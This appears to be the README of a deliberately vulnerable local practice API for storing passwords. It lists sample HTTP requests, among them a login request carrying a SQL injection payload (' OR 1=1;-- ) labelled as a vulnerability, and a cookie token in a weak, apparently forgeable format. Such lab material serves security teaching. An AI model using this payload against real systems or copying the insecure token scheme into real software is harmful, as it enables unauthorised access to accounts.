# VULNERABLE API

Start server

`python .backend/main.py`

## Endpoints

#### POST users

```POST /login HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 52

{
    "username":"juan",
    "password":"perez"
}
```

VULNERABLE A 

```
POST /login HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 57

{
    "username":"' OR 1=1;-- ",
    "password":""
}
```

```
POST /register HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 52

{
    "username":"juan",
    "password":"perez"
}
```
#### POST passwords

```
POST /password HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: token="alejo?True"
Content-Length: 99

{
    "app_username": "alejovillores",
    "password": "password",
    "app_name": "facebook"
}
```

#### GET passwords

```
GET /password?app_name=facebook HTTP/1.1
Host: localhost:5000
Cookie: token="alejo?True"
```

